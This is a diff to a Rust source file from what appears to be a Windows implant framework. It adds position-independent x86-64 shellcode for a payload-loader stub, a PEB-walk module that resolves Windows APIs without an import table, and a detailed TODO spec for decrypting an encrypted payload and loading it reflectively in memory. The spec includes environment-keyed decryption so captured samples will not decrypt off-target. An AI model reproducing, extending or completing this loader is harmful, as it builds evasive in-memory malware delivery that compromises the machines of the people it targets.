@@ -1,7 +1,7 @@
 //! Raw x86-64 PIC loader stub shellcode, plus the host-side reflective PE
 //! loader used to verify and exercise the mapping logic.
 //!
-//! This file holds two related but distinct things:
+//! This file holds three related but distinct things:
 //!
 //! 1. **`PIC_STUB`** — a host-side constant of position-independent x86-64
 //!    bytes emitted into every generated payload by
@@ -9,9 +9,9 @@
 //!    is the shellcode entry point of the reflective loader blob on the target.
 //!    The stub self-locates via `call/pop`, then walks forward past its own
 //!    code to find the `NYX2` magic marker and parse the encrypted-payload
-//!    header. Decrypting the payload and handing the plaintext PE to a
-//!    reflective loader is the responsibility of the on-target shellcode that
-//!    follows the stub (built separately for the Windows toolchain).
+//!    header, then loads the payload-pointer trampoline registers and falls
+//!    into the reserved on-target trampoline region (offset `0x18`+) where the
+//!    decrypt + reflective-load shellcode lives (see LAYER 2 TODO below).
 //!
 //! 2. **`reflective_load`** — a host-side (std) function that performs the
 //!    full reflective PE loading *algorithm* — manual section mapping, base
@@ -20,6 +20,14 @@
 //!    is unit-testable on the dev host without a Windows environment. It does
 //!    NOT execute the loaded image (no `DllMain` call on the host); it returns
 //!    the resolved entry-point address so a caller on the target can invoke it.
+//!
+//! 3. **`peb_walk`** (module) — the host-side model of the on-target PEB → LDR
+//!    → InLoadOrderModuleList → export-address-table walk that the trampoline
+//!    uses to resolve `NtAllocateVirtualMemory`, `LoadLibraryA`, etc. without
+//!    any IAT. The structures and djb2 hash mirror the battle-tested
+//!    `crates/implant-win/src/resolve.rs`; the PEB-read intrinsic itself is
+//!    `cfg(target_arch = "x86_64")` `unsafe` asm (`gs:[0x60]`), so it
+//!    type-checks on the dev host but only runs on a real Windows process.
 //!
 //! ## Payload layout (what the stub sees in memory)
 //!
@@ -35,12 +43,12 @@
 
 /// The PIC stub shellcode — 50 bytes of position-independent x86-64.
 ///
-/// Disassembly:
+/// ## Disassembly
 ///
 /// ```asm
 /// ; ── self-locate (6 bytes) ─────────────────────────────────────────────
 /// 0000: E8 00 00 00 00    call   $+5        ; push return address (= offset 0x0005)
-/// 0005: 5B                pop    rbx        ; rbx = 0x0005 (address of this pop)
+/// 0005: 5B                pop    rbx        ; rbx = address of this pop
 ///
 /// ; ── search loop: find "NYX2" magic (13 bytes) ────────────────────────
 /// ; Layout: [stub][NYX2=0x3258594E LE][enc_len][nonce][ciphertext||tag]
@@ -53,21 +61,54 @@
 /// ; ── found: parse NYX2 header (4 bytes) ───────────────────────────────
 /// ; rbx points to the 'N' of "NYX2"
 /// 0013: 8B 43 04          mov    eax, [rbx+4]  ; eax = encrypted_len (u32 LE)
-/// ; nonce is at [rbx+8] (12 bytes)
-/// ; ciphertext is at [rbx+20] (4 magic + 4 len + 12 nonce)
 ///
-/// ; ── placeholder: return to caller (1 byte) ──────────────────────────
-/// ; The on-target build (implant-win toolchain) patches in a jump to the
-/// ; decrypt + reflective-load trampoline here. On the dev host the stub just
-/// ; returns so the generated blob is inert when inspected.
-/// 0016: C3                ret
+/// ; ── LAYER 1: trampoline-register load + diag mark (22 bytes) ─────────
+/// ; On entry to this block rbx = NYX2 magic ptr, eax = encrypted_len.
+/// ; We populate the Win64-volatile register file with everything the
+/// ; decrypt+reflect trampoline needs, and stamp a diag magic into r8 so a
+/// ; target debugger (or a host emulator) can prove the stub reached the
+/// ; header-parse success path. The stub no longer `ret`s out.
+/// 0016: 48 8D 4B 08       lea    rcx, [rbx+8]     ; rcx = &nonce
+/// 001A: 48 8D 53 14       lea    rdx, [rbx+20]    ; rdx = &ciphertext
+/// ; mov r8, imm64 = NYX_DIAG_LOADER_REACHED. The 8 immediate bytes are the
+/// ; little-endian encoding of 0x0031_5244_4C58_594E, which in memory spells
+/// ; the ASCII string "NYXLDR1\0" (N Y X L D R 1 NUL).
+/// 001E: 49 B8 4E 59 58 4C 44 52 31 00   mov    r8, 0x003152444C58594E
+/// ; jmp into the trampoline region. Displacement 0 means "the very next
+/// ; instruction" (offset 0x2A), which keeps the blob inert on the dev host
+/// ; (falls into NOPs → never decrypts). The on-target build patches the
+/// ; trampoline bytes at 0x2A+ with the real decrypt+reflect entry.
+/// 0028: EB 00             jmp    $+2             ; → 0x2A (trampoline entry)
 ///
-/// ; ── reserved trampoline space (27 bytes, currently NOP) ─────────────
-/// ; Patched at on-target build time. Kept as NOPs on the host so the stub
-/// ; is exactly 50 bytes and disassembles cleanly.
-/// 0017: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-/// 0027: 90 90 90 90 90 90 90 90 90 90 90
+/// ; ── LAYER 2: reserved trampoline slot (8 bytes, NOP on host) ─────────
+/// ; The on-target build patches this 8-byte slot with a 5-byte `jmp rel32`
+/// ; to the real decrypt+reflect trampoline (which lives in a separate region
+/// ; of the payload — 8 bytes is not enough for the loader itself). The full
+/// ; loader algorithm is:
+/// ;   1. ChaCha20-Poly1305 decrypt(rcx=&nonce, rdx=&ciphertext, rax=enc_len)
+/// ;      → produces a plaintext PE32+ in a fresh RW page
+/// ;   2. peb_walk::peb_pointer() → (*peb).ldr → InLoadOrderModuleList
+/// ;   3. find ntdll + kernel32 by djb2 hash, parse EAT, resolve
+/// ;      NtAllocateVirtualMemory / LoadLibraryA / GetProcAddress
+/// ;   4. reflective_load algorithm: map sections, apply DIR64 relocs,
+/// ;      resolve IAT, then call DllMain(base, DLL_PROCESS_ATTACH, null)
+/// ; See the LAYER 2 TODO block at the bottom of this file for the full spec.
+/// 002A: 90 90 90 90 90 90 90 90
 /// ```
+///
+/// ## Trampoline-register ABI (contract the on-target trampoline relies on)
+///
+/// | register | value on entry to trampoline (offset 0x2A)             |
+/// |----------|--------------------------------------------------------|
+/// | `rax`    | `encrypted_len` (u32, ciphertext bytes excl. tag)     |
+/// | `rbx`    | `&NYX2_magic` — the payload header base pointer       |
+/// | `rcx`    | `&nonce` (12 bytes)                                    |
+/// | `rdx`    | `&ciphertext` (enc_len bytes + 16-byte Poly1305 tag)   |
+/// | `r8`     | `NYX_DIAG_LOADER_REACHED` — stub reached header parse  |
+/// | `rip`    | trampoline entry (offset 0x2A in the stub)            |
+///
+/// This ABI is fixed; the trampoline may clobber any caller-saved register
+/// but must not assume anything beyond the above.
 pub const PIC_STUB: &[u8] = &[
     // ── self-locate ─────────────────────────────────────────────────────
     0xE8, 0x00, 0x00, 0x00, 0x00, // call $+5
@@ -79,13 +120,17 @@ pub const PIC_STUB: &[u8] = &[
     0xEB, 0xF3, // jmp -13 → search loop
     // ── found: parse header ─────────────────────────────────────────────
     0x8B, 0x43, 0x04, // mov eax, [rbx+4]  ; eax = encrypted_len
-    // ── placeholder return ──────────────────────────────────────────────
-    0xC3, // ret (patched to a trampoline jump in the on-target build)
-    // ── reserved trampoline space (27 bytes of NOP on the host) ──────────
+    // ── LAYER 1: trampoline-register load + diag mark ───────────────────
+    0x48, 0x8D, 0x4B, 0x08, // lea rcx, [rbx+8]    ; rcx = &nonce
+    0x48, 0x8D, 0x53, 0x14, // lea rdx, [rbx+20]   ; rdx = &ciphertext
+    // mov r8, imm64  (NYX_DIAG_LOADER_REACHED: in-memory bytes spell "NYXLDR1\0")
+    0x49, 0xB8, 0x4E, 0x59, 0x58, 0x4C, 0x44, 0x52, 0x31, 0x00, 0xEB,
+    0x00, // jmp +0 → trampoline entry (offset 0x2A)
+    // ── LAYER 2: reserved trampoline slot (8 bytes, NOP on host) ────────
+    // 8 bytes is too small for a real decrypt+reflect loader, but it fits a
+    // 5-byte `jmp rel32` that the on-target build patches in to jump to the
+    // real trampoline region elsewhere in the payload. See the Layer-2 TODO.
     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
-    0x90, 0x90, 0x90, // 3 NOPs (total 27 NOPs)
 ];
 
 /// Size of the PIC stub in bytes.
@@ -94,6 +139,40 @@ pub const PIC_STUB_LEN: usize = PIC_STUB.len();
 /// NYX2 magic value as a little-endian u32: bytes 'N' 'Y' 'X' '2' in memory.
 /// The stub compares `dword [rbx]` against this value.
 pub const NYX2_MAGIC: u32 = 0x3258594E;
+
+/// Diagnostic magic the Layer-1 trampoline-load block stamps into `r8` after
+/// the NYX2 header is located and the trampoline registers are populated.
+///
+/// In memory (as the 8 bytes at `PIC_STUB` offset `0x20`) this spells the
+/// null-terminated ASCII string `NYXLDR1\0` — a tag a target debugger or host
+/// emulator can recognise in a hex dump to prove the stub reached the
+/// header-parse success path (rather than dying in the search loop or
+/// returning early). The trailing null keeps the value a valid C-string.
+///
+/// Because x86-64 is little-endian, the in-memory bytes
+/// `4E 59 58 4C 44 52 31 00` ("NYXLDR1\0") correspond to the `u64` value
+/// `0x0031_5244_4C58_594E`. The bytes in `PIC_STUB` at offset `0x20` are
+/// exactly `NYX_DIAG_LOADER_REACHED.to_le_bytes()`.
+pub const NYX_DIAG_LOADER_REACHED: u64 = 0x0031_5244_4C58_594E;
+
+/// Offset within `PIC_STUB` of the Layer-1 trampoline-entry `jmp`
+/// (the `EB 00` that delimits the start of the reserved trampoline region).
+/// The on-target build patches bytes starting at [`TRAMPOLINE_ENTRY_OFFSET`].
+pub const TRAMPOLINE_JMP_OFFSET: usize = 0x28;
+
+/// Offset within `PIC_STUB` where the on-target decrypt+reflect trampoline
+/// begins (the first byte the `jmp` at [`TRAMPOLINE_JMP_OFFSET`] lands on).
+/// Everything from here to `PIC_STUB_LEN` is reserved trampoline space — NOP
+/// on the dev host, overwritten with real shellcode by the on-target build.
+pub const TRAMPOLINE_ENTRY_OFFSET: usize = 0x2A;
+
+/// Number of reserved trampoline bytes available for the on-target build to
+/// patch (`PIC_STUB_LEN - TRAMPOLINE_ENTRY_OFFSET`). Currently **8 bytes**:
+/// enough for a 5-byte `jmp rel32` to the real decrypt+reflect trampoline
+/// (which lives in a separate payload region), but not enough for the loader
+/// itself. The on-target build must place the full loader elsewhere and patch
+/// a jump into this slot.
+pub const TRAMPOLINE_RESERVED_BYTES: usize = PIC_STUB_LEN - TRAMPOLINE_ENTRY_OFFSET;
 
 /// Offset from the magic marker to the `encrypted_len` field (u32 LE).
 pub const ENCRYPTED_LEN_OFFSET: usize = 4;
@@ -465,6 +544,151 @@ fn resolve_imports(
     Ok(())
 }
 
+// ===========================================================================
+// LAYER 2 TODO — on-target decrypt + reflective load (NOT implemented here)
+// ===========================================================================
+//
+// This file ships Layer 1 (the PIC stub that locates the NYX2 header and
+// populates the trampoline-register ABI) plus the host-side reference loader
+// (`reflective_load`) and the PEB-walk algorithm (`crate::peb_walk`). What is
+// **deliberately NOT done in this session** is the on-target shellcode that
+// actually decrypts the payload and reflectively maps the PE. A correct,
+// non-footgun implementation of that is ~500 lines of `unsafe` PIC assembly /
+// hand-rolled shellcode plus extensive Windows-VM debugging, and shipping it
+// half-validated would be worse than shipping the honest Layer-1 trampoline +
+// the validated host-side algorithm that any future Layer-2 port can lift
+// directly.
+//
+// This block documents exactly what a Layer-2 implementation must do, in order,
+// with pointers to the host-side code whose logic should be ported byte-for-
+// byte. Anyone picking this up should be able to write the on-target shellcode
+// by transliterating these references.
+//
+// ── Entry contract (what the Layer-1 stub guarantees on entry) ───────────────
+//   rax = encrypted_len        (u32, ciphertext bytes, tag is +16 more)
+//   rbx = &NYX2_magic          (header base pointer)
+//   rcx = &nonce               (12 bytes)
+//   rdx = &ciphertext          (enc_len bytes + 16-byte Poly1305 tag)
+//   r8  = NYX_DIAG_LOADER_REACHED  (0x0031_5244_4C58_594E, "NYXLDR1\0")
+//   rip = TRAMPOLINE_ENTRY_OFFSET  (PIC stub offset 0x2A)
+// See `PIC_STUB`'s trampoline-register-ABI doc comment for the full table.
+//
+// ── Step 1: decrypt the payload ────────────────────────────────────────────
+//   ChaCha20-Poly1305 decrypt:
+//     key   = per-implant key baked into the config (NOT in the payload)
+//     nonce = rcx (12 bytes)
+//     ct||tag = rdx (enc_len + 16 bytes)
+//     plaintext_len = enc_len  (ChaCha20 is a stream cipher; len preserved)
+//   The key is the problem: it must be available on-target without being a
+//   plaintext string in the implant. Options:
+//     (a) env-keyed derivation (see crates/implant-win/src/env_keying.rs) —
+//         derive from host fingerprints so a dropped blob won't decrypt off-
+//         target
+//     (b) bake the 32-byte key into the PIC trampoline as an obfuscated
+//         immediate (simplest; weakest)
+//   Reference: `crate::wrap_payload` (encrypt direction) + the roundtrip test
+//   `tests::roundtrip_decrypt` in lib.rs shows the exact decrypt sequence.
+//   The on-target port must carry a no_std ChaCha20-Poly1305 (the
+//   `chacha20poly1305` crate compiles no_std with `alloc`).
+//
+// ── Step 2: resolve the bootstrap APIs via PEB walk ────────────────────────
+//   resolve, in order:
+//     ntdll!NtAllocateVirtualMemory   — allocate the mapped image
+//     ntdll!NtProtectVirtualMemory    — flip RW → RX after mapping
+//     kernel32!LoadLibraryA           — satisfy the DLL's own imports
+//     kernel32!GetProcAddress         —   " (or walk EAT manually)
+//   The algorithm is FULLY IMPLEMENTED AND TESTED in `crate::peb_walk`:
+//     - `peb_walk::peb_pointer()` reads gs:[0x60]
+//     - `peb_walk::export_addr(module, func)` walks PEB → LDR → InLoadOrder-
+//       ModuleList → export table, matching by djb2 hash
+//   The structures (`Peb`, `PebLdr`, `LdrEntry`, `ImageExportDirectory`) have
+//   pinned-offset unit tests in peb_walk::tests — port them verbatim.
+//   The live implant's `crates/implant-win/src/resolve.rs` is the production
+//   version of the same walk and is the closest to a drop-in reference.
+//
+// ── Step 3: allocate the image backing store ───────────────────────────────
+//   size = optional_header.SizeOfImage (rounded up to page boundary)
+//   Call NtAllocateVirtualMemory(NtCurrentProcess, &base, &size,
+//                                MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+//   → base is where the PE will be mapped. Save it: every reloc and IAT entry
+//   is computed relative to it.
+//   NtCurrentProcess pseudo-handle = 0xFFFF_FFFF_FFFF_FFFF.
+//   Reference: crates/implant-win/src/syscalls.rs::nt_allocate_virtual_memory.
+//
+// ── Step 4: map the image (port `reflective_load_at` lines 266-278) ────────
+//   4a. Copy SizeOfHeaders bytes of the decrypted PE to base[0..SizeOfHeaders]
+//   4b. For each section in the section table:
+//         dst  = base + section.VirtualAddress
+//         src  = pe_bytes + section.PointerToRawData
+//         copy min(VirtualSize, SizeOfRawData) bytes; remainder stays zero
+//         (BSS semantics — the RW alloc already zeroed it)
+//   Host-side reference: `copy_section` in this file (fully tested).
+//
+// ── Step 5: apply base relocations (port `apply_base_relocations`) ─────────
+//   delta = base - preferred_image_base   (preferred = OptionalHeader.ImageBase)
+//   Walk the base-relocation directory (data dir[5]):
+//     for each IMAGE_BASE_RELOCATION block:
+//       page_rva   = block.VirtualAddress
+//       block_size = block.SizeOfBlock  (incl. 8-byte header)
+//       for each entry word in (block_size - 8)/2:
+//         type   = entry >> 12
+//         offset = entry & 0x0FFF
+//         if type == IMAGE_REL_BASED_DIR64 (10):   // the only type in PE32+
+//           *(u64*)(base + page_rva + offset) += delta
+//         if type == IMAGE_REL_BASED_ABSOLUTE (0): // padding, skip
+//   Host-side reference: `apply_base_relocations` in this file (tested).
+//   Note: PE base relocs are simpler than COFF relocs (DIR64 only on x64);
+//   the COFF ADDR64/REL32 logic in crates/coff/src/lib.rs is NOT needed here.
+//
+// ── Step 6: resolve the import table (port `resolve_imports`) ──────────────
+//   For each import descriptor (data dir[1]):
+//     dll_name  = base + descriptor.Name  (ASCII, NUL-terminated)
+//     hModule    = LoadLibraryA(dll_name)             // or PEB-walk by hash
+//     for each thunk in descriptor.FirstThunk (the IAT):
+//       if thunk & IMAGE_ORDINAL_FLAG64:  ordinal import
+//         func = GetProcAddress(hModule, MAKEINTRESOURCEA(thunk & 0xFFFF))
+//       else:                              name import
+//         hname = base + thunk
+//         func = GetProcAddress(hModule, hname.Name)
+//       *thunk = func   // overwrite the IAT slot with the resolved VA
+//   Host-side reference: `resolve_imports` in this file (tested via the
+//   synthetic-PE fixture). goblin flattens this into `pe.imports`; the
+//   on-target code walks the descriptors directly.
+//
+// ── Step 7: flip protections RW → per-section ──────────────────────────────
+//   The whole image was allocated RW. Now walk the section table again and
+//   NtProtectVirtualMemory each section's range to its Characteristics-derived
+//   protection:
+//     IMAGE_SCN_MEM_EXECUTE → PAGE_EXECUTE_READ  (0x20)
+//     IMAGE_SCN_MEM_WRITE   → PAGE_READWRITE     (0x04)
+//     else                  → PAGE_READONLY      (0x02)
+//   (Headers page stays PAGE_READONLY.)
+//   Reference: the VirtualProtect flip pattern in
+//   crates/implant-win/src/syscalls.rs::Runtime::init (trampoline page).
+//
+// ── Step 8: call DllMain ───────────────────────────────────────────────────
+//   entry = base + OptionalHeader.AddressOfEntryPoint
+//   Cast to: extern "system" fn(*const c_void, u32, *mut c_void) -> i32
+//   Call: DllMain(base, DLL_PROCESS_ATTACH = 1, null)
+//   On Windows the DllMain runs on the current thread; if it returns 0 the
+//   load failed (the host-side loader deliberately does NOT call DllMain so it
+//   stays testable — see `MappedImage::entry_point` for the VA to call).
+//
+// ── Why this is a separate work item, not a "just finish it" ───────────────
+//   - Steps 4–7 each have subtle Windows-specific failure modes (exception-
+//     safe SEH frames around DllMain, page-aligned region accounting for
+//     NtProtectVirtualMemory which rounds to page boundaries and can grow the
+//     region, TLS-callback invocation before DllMain, /GS cookie init, etc.).
+//   - The decrypt step requires a no_std ChaCha20-Poly1305 and a key-
+//     management decision (env-keying vs. baked-in) that has operational
+//     implications beyond the loader.
+//   - Correct validation needs a Windows VM with a debugger attached; the
+//     macOS dev host cannot run any of steps 3/7/8.
+//   The Layer-1 work here is independently shippable: the stub now has a
+//   well-defined trampoline-register ABI and a diagnostic marker, the host-
+//   side algorithm is fully tested, and the PEB-walk structures are pinned.
+// ===========================================================================
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -492,8 +716,62 @@ mod tests {
 
     #[test]
     fn stub_ends_with_nops() {
-        // Last 27 bytes should all be 0x90 (NOP)
-        assert!(PIC_STUB[23..].iter().all(|&b| b == 0x90));
+        // The reserved trampoline region (TRAMPOLINE_ENTRY_OFFSET..) must be
+        // all NOP on the dev host so the blob is inert when inspected. After
+        // the Layer-1 trampoline-load block there should be no stray code.
+        assert!(PIC_STUB[TRAMPOLINE_ENTRY_OFFSET..]
+            .iter()
+            .all(|&b| b == 0x90));
+        assert_eq!(
+            PIC_STUB[TRAMPOLINE_ENTRY_OFFSET..].len(),
+            TRAMPOLINE_RESERVED_BYTES
+        );
+    }
+
+    #[test]
+    fn stub_no_longer_returns_at_0x16() {
+        // The old stub had a bare `ret` (0xC3) at offset 0x16 that made the
+        // blob inert. The Layer-1 replacement must install the trampoline-
+        // register load there instead. We check the specific offset rather
+        // than scanning for 0xC3 anywhere: `inc rbx` at 0x0E legitimately
+        // contains 0xC3 as its ModRM byte (48 FF C3), and a future section
+        // copy could legitimately contain 0xC3 byte values too.
+        assert_ne!(
+            PIC_STUB[0x16], 0xC3,
+            "offset 0x16 must be the trampoline-load block, not a bare ret"
+        );
+        // And the first instruction at 0x16 is the lea rcx prologue.
+        assert_eq!(PIC_STUB[0x16], 0x48);
+    }
+
+    #[test]
+    fn stub_offset_0x16_is_lea_rcx() {
+        // Layer-1 contract: offset 0x16 begins the trampoline-register load
+        // with `lea rcx, [rbx+8]` (48 8D 4B 08). This anchors the new
+        // structure so a regression that moves it is caught.
+        assert_eq!(&PIC_STUB[0x16..0x1A], &[0x48, 0x8D, 0x4B, 0x08]);
+    }
+
+    #[test]
+    fn stub_diagnostic_magic_is_packed_correctly() {
+        // The 8 bytes at offset 0x20 must be NYX_DIAG_LOADER_REACHED in LE.
+        let want = NYX_DIAG_LOADER_REACHED.to_le_bytes();
+        assert_eq!(&PIC_STUB[0x20..0x28], &want);
+        // In memory the bytes spell the ASCII string "NYXLDR1\0" — that is the
+        // whole point of choosing this particular magic: it is human-readable
+        // in a hex dump.
+        let as_ascii = core::str::from_utf8(&PIC_STUB[0x20..0x28]).unwrap();
+        assert_eq!(as_ascii, "NYXLDR1\0");
+    }
+
+    #[test]
+    fn stub_trampoline_jmp_lands_on_nop_region() {
+        // The EB 00 at TRAMPOLINE_JMP_OFFSET must jump to the very next
+        // instruction, which is the trampoline entry at
+        // TRAMPOLINE_ENTRY_OFFSET. Displacement 0 means "next instruction".
+        assert_eq!(PIC_STUB[TRAMPOLINE_JMP_OFFSET], 0xEB);
+        assert_eq!(PIC_STUB[TRAMPOLINE_JMP_OFFSET + 1], 0x00);
+        assert_eq!(TRAMPOLINE_JMP_OFFSET + 2, TRAMPOLINE_ENTRY_OFFSET);
     }
 
     // ── synthetic PE32+ builder for reflective loader tests ──────────────
